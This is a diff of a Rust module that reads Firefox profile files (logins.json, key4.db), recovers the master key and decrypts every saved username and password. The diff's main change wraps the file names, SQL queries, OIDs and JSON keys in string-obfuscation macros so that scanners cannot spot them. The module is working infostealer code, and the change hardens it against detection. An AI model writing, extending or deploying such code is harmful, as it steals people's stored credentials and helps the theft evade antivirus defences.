@@ -1,23 +1,34 @@
-use std::{fs::{self, DirEntry}, num::NonZeroU32, path::Path};
+use std::{
+    fs::{self, DirEntry},
+    num::NonZeroU32,
+    path::Path,
+};
 
 use crate::browser::Login;
 
+use obfstr::{obfbytes, obfstr};
 use serde_json;
 
+use aes::{
+    cipher::{
+        block_padding::Pkcs7,
+        generic_array::GenericArray,
+        typenum::{self},
+        BlockDecryptMut, KeyIvInit,
+    },
+    Aes256,
+};
 use base64::prelude::*;
-use der_parser::ber;
-use sha1::{Sha1, Digest};
-use ring::pbkdf2::PBKDF2_HMAC_SHA256;
-use aes::{Aes256, cipher::{block_padding::Pkcs7, generic_array::GenericArray, typenum::{self}, BlockDecryptMut, KeyIvInit}};
 use cbc::Decryptor;
+use der_parser::ber;
 use des::TdesEde3;
+use ring::pbkdf2::PBKDF2_HMAC_SHA256;
+use sha1::{Digest, Sha1};
 
 use rusqlite::Connection;
 
 type Aes256CbcDec = Decryptor<Aes256>;
 type TripleDesCbcDec = Decryptor<TdesEde3>;
-
-static CKA_ID: &[u8; 16] = b"\xf8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01";
 
 pub fn get_creds_fox(path: &Path) -> Option<Vec<Login>> {
     let mut creds: Vec<Login> = Vec::new();
@@ -26,20 +37,24 @@ pub fn get_creds_fox(path: &Path) -> Option<Vec<Login>> {
             creds.extend(cred);
         }
     }
-    if creds.is_empty() {return None;}
+    if creds.is_empty() {
+        return None;
+    }
     Some(creds)
 }
 
 fn decrypt(cred: &str, key: &[u8]) -> Option<String> {
     let cred1 = BASE64_STANDARD.decode(cred).ok()?;
     let (_, cred2) = ber::parse_ber(&cred1).ok()?;
-    if cred2[1][0].as_oid().ok()?.to_id_string() == "1.2.840.113549.3.7" {
+    if cred2[1][0].as_oid().ok()?.to_id_string() == obfstr!("1.2.840.113549.3.7") {
         let iv = cred2[1][1].as_slice().ok()?;
         let iv_generic_array = GenericArray::clone_from_slice(&iv);
         let key_generic_array = GenericArray::clone_from_slice(&key[0..24]);
         let enc_data = cred2[2].as_slice().ok()?;
 
-        let raw_clear_data = TripleDesCbcDec::new(&key_generic_array, &iv_generic_array).decrypt_padded_vec_mut::<Pkcs7>(&enc_data).ok()?;
+        let raw_clear_data = TripleDesCbcDec::new(&key_generic_array, &iv_generic_array)
+            .decrypt_padded_vec_mut::<Pkcs7>(&enc_data)
+            .ok()?;
         Some(String::from_utf8(raw_clear_data).ok()?)
     } else {
         return None;
@@ -47,50 +62,65 @@ fn decrypt(cred: &str, key: &[u8]) -> Option<String> {
 }
 
 fn get_creds_from_profile(profile: DirEntry) -> Option<Vec<Login>> {
-    
     let mut creds: Vec<Login> = Vec::new();
-    let login_file = profile.path().join("logins.json");
-    if !login_file.is_file() {return None;}
+    let login_file = profile.path().join(obfstr!("logins.json"));
+    if !login_file.is_file() {
+        return None;
+    }
     let data = fs::read_to_string(login_file).ok()?;
     let json: serde_json::Value = serde_json::from_str(&data).ok()?;
 
-    let key_file = profile.path().join("key4.db");
+    let key_file = profile.path().join(obfstr!("key4.db"));
 
     let conn = Connection::open(key_file).ok()?;
-    let mut row = conn.prepare("SELECT item1, item2 FROM metadata WHERE id = 'password' LIMIT 1;").ok()?;
-    let (item1, item2) = row.query_row([], |row| {
-        let item1: Vec<u8> = row.get(0)?;
-        let item2: Vec<u8> = row.get(1)?;
-        Ok((item1, item2))
-    }).ok()?;
+    let mut row = conn
+        .prepare(obfstr!(
+            "SELECT item1, item2 FROM metadata WHERE id = 'password' LIMIT 1;"
+        ))
+        .ok()?;
+    let (item1, item2) = row
+        .query_row([], |row| {
+            let item1: Vec<u8> = row.get(0)?;
+            let item2: Vec<u8> = row.get(1)?;
+            Ok((item1, item2))
+        })
+        .ok()?;
     let password = get_clear_value(&item2, &item1)?;
-    if password != "password-check".as_bytes() {return None;}
-    
-    let mut row = conn.prepare("SELECT a11,a102 FROM nssPrivate LIMIT 1;").ok()?;
+    if password != obfbytes!(b"password-check") {
+        return None;
+    }
 
-    let (a11, a102) = row.query_row([], |row| {
-        let a11: Vec<u8> = row.get(0)?;
-        let a102: Vec<u8> = row.get(1)?;
-        Ok((a11, a102))
-    }).ok()?;
-    
-    if a102 != CKA_ID {return None;}
+    let mut row = conn
+        .prepare(obfstr!("SELECT a11,a102 FROM nssPrivate LIMIT 1;"))
+        .ok()?;
+
+    let (a11, a102) = row
+        .query_row([], |row| {
+            let a11: Vec<u8> = row.get(0)?;
+            let a102: Vec<u8> = row.get(1)?;
+            Ok((a11, a102))
+        })
+        .ok()?;
+
+    if a102 != obfbytes!(b"\xf8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01") {
+        return None;
+    }
     let key = get_clear_value(&a11, &item1)?;
-    for i in json["logins"].as_array()? {
+    for i in json[obfstr!("logins")].as_array()? {
         creds.push(Login {
-            host: i["hostname"].as_str()?.to_string(),
-            user: decrypt(&i["encryptedUsername"].as_str()?, &key)?,
-            pass: decrypt(&i["encryptedPassword"].as_str()?, &key)?,
+            host: i[obfstr!("hostname")].as_str()?.to_string(),
+            user: decrypt(&i[obfstr!("encryptedUsername")].as_str()?, &key)?,
+            pass: decrypt(&i[obfstr!("encryptedPassword")].as_str()?, &key)?,
         })
     }
-    return Some(creds)
+    return Some(creds);
 }
 
 fn get_clear_value(ber: &[u8], salt: &[u8]) -> Option<Vec<u8>> {
     let (_, decoded) = der_parser::der::parse_der(ber).ok()?;
 
     let algorithm = decoded[0][0].as_oid().ok()?.to_id_string();
-    if algorithm == "1.2.840.113549.1.5.13" {
+    if algorithm == obfstr!("1.2.840.113549.1.5.13") {
         let entry_salt = decoded[0][1][0][1][0].as_slice().ok()?;
         let iteration_count = decoded[0][1][0][1][1].as_u32().ok()?;
         let key_length = decoded[0][1][0][1][2].as_u32().ok()?;
@@ -118,14 +148,17 @@ fn get_clear_value(ber: &[u8], salt: &[u8]) -> Option<Vec<u8>> {
             let mut iv = Vec::with_capacity(iv_header.len() + iv_body.len());
             iv.extend_from_slice(&iv_header);
             iv.extend_from_slice(iv_body);
-            let iv_generic_array: GenericArray<u8, typenum::U16> = GenericArray::clone_from_slice(&iv);
+            let iv_generic_array: GenericArray<u8, typenum::U16> =
+                GenericArray::clone_from_slice(&iv);
 
-            let value = Aes256CbcDec::new(&key_generic_array, &iv_generic_array).decrypt_padded_vec_mut::<Pkcs7>(&cipher_txt).ok()?;
+            let value = Aes256CbcDec::new(&key_generic_array, &iv_generic_array)
+                .decrypt_padded_vec_mut::<Pkcs7>(&cipher_txt)
+                .ok()?;
             return Some(value);
         } else {
             return None;
         }
     } else {
-    return None;
+        return None;
     }
 }
